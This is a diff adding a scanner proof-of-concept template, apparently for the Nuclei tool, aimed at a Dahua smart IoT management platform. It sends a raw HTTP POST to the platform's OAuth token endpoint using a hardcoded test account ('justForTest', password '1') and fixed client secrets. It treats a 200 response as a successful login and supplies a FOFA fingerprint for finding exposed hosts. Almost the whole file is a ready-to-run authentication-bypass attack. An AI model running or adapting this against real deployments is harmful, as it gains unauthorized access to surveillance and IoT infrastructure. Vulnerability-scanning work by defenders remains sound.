@@ -1,0 +1,40 @@
+id: poc-yifs77oycp4o96gd
+info:
+  name: 大华智能物联综合管理平台存在justForTest用户登录漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/yifs77oycp4o96gd
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: other,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: yifs77oycp4o96gd
+    fofa: icon_hash="-1935899595"
+http:
+- raw:
+  - 'POST /evo-apigw/evo-oauth/oauth/token HTTP/2
+
+    Host: {{Hostname}}
+
+    Cookie: JSESSIONID=F6485241C571CC8D6D22649B4F9A8AC9
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: 109
+
+
+    username=justForTest&password=1&grant_type=password&client_id=web_client&client_secret=web_client&public_key='
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
